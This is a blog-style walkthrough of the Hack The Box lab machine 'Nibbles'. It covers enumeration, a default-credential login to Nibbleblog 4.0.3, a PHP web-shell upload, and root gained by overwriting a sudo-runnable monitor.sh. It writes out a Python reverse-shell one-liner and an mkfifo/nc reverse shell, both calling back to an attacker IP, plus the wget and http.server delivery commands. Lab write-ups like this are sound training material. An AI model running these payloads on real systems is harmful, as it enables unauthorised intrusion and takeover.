---
title: Nibbles Hackthebox Writeup
date: 2020-12-27 09:00:00 +0800
categories: [Hackthebox, Retired]
tags: [linux,nibbleblog,nibbleblog v4.0.3,php]     # TAG names should always be lowercase
image: /assets/img/nibbles-hackthebox/nibbles-pic.png
subtitle: JHBDOcubeoveiubo
---


# Introduction@Nibbles:~$


Column | Details
------------ | -------------
Name | Nibbles
IP | 10.10.10.75
Points | 20
Os | Linux
Difficult | Easy
Creator | [mrb3n](https://www.hackthebox.eu/profile/2984)
Out on | 13th january 2018

# Summary:~$

* Discovering the new host and scanning for open ports.
* Found `/nibbleblog/` in **source code**, and then used `gobuster` for searching directories.
* Accessing `admin` page with *default* credentials as `admin:nibbles`.
* Got `User Shell` by uploading a PHP reverse shell.
* Escalated Privileges using `sudo -l` and then changed the content of a file which can be run as sudo.

# Starting:~$

## Nmap

Running nmap gave us that `Port 80` is open. Let's check port 80.

**Nmap Command**: `nmap -T4 -sV -Pn 10.10.10.7`

___
![](/assets/img/nibbles-hackthebox/port-80-2.png)

Let's check the `source code` of this page.

___
![](/assets/img/nibbles-hackthebox/checking-source-code-3.png)

Accessing `/nibbleblog/` We got this:

___
![](/assets/img/nibbles-hackthebox/checking-nibbleblog-website-4.png)

I ran `gobuster` on /nibbleblog/ for *directory searching*.

**Command**: *gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.75/nibbleblog/ -t 100*

___
![](/assets/img/nibbles-hackthebox/gobuster-6.png)

I got to know `Nibbleblog` version by checking `/nibbleblog/README` which is `v4.0.3`

___
![](/assets/img/nibbles-hackthebox/accessing-readme-7.png)

Accessing `/nibbleblog/admin`, I got an admin pannel for *Nibbleblog*

___
![](/assets/img/nibbles-hackthebox/admin-area-access-9.png)

Tried using the default credentials for **Nibbleblog** i.e. *Username*: `admin` and *Password*: `nibbles` and logged into the dashboard.

___
![](/assets/img/nibbles-hackthebox/nibbles-admin-dashboard-10.png)

I googled about `Nibbleblog version 4.0.3` and found this [blog](https://wikihak.com/how-to-upload-a-shell-in-nibbleblog-4-0-3/)

___
![](/assets/img/nibbles-hackthebox/nibble-version-search-8.png)

Uploaded a single line [php shell](https://www.grobinson.me/single-line-php-script-to-gain-shell/) and accessing it as mentioned in the above `blog`.

___
![](/assets/img/nibbles-hackthebox/single-line-php-shell-11.png)

Now to get a `reverse shell`, I captured the request on *burp repeater* and sent my `python` payload using *URL encoding*.
[Python Payload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

**Command**: *python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.X.X”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'*

___
![](/assets/img/nibbles-hackthebox/got-user-shell-12.png)

For `Privilege Escalation`, I used the command `sudo -l` to check what permissions do we have.

___
![](/assets/img/nibbles-hackthebox/sudo-l-14.png)

We can run `monitor.sh` as administrator, let's access **personalzip** using the `unzip` command. and then replace `monitor.sh` with our own malicious *monitor.sh* and get `Root`.

___
![](/assets/img/nibbles-hackthebox/unzip-15.png)

Replacing `monitor.sh` with our infected *monitor.sh*.

**monitor.sh**: *echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.X.X 8899 >/tmp/f"*

Transfering it via `wget command`.

**Wget Command**: wget http://10.10.X.X:8081/monitor.sh

**Hosting Command for monitor.sh**: *python3 -m http.server 8081*

___
![](/assets/nibbles-hackthebox/wget-commands-16.png)

Running `monitor.sh` as sudo and listeing on the specified port on `nc`. We got `Root`.

___
![](/assets/img/nibbles-hackthebox/got-root.png)
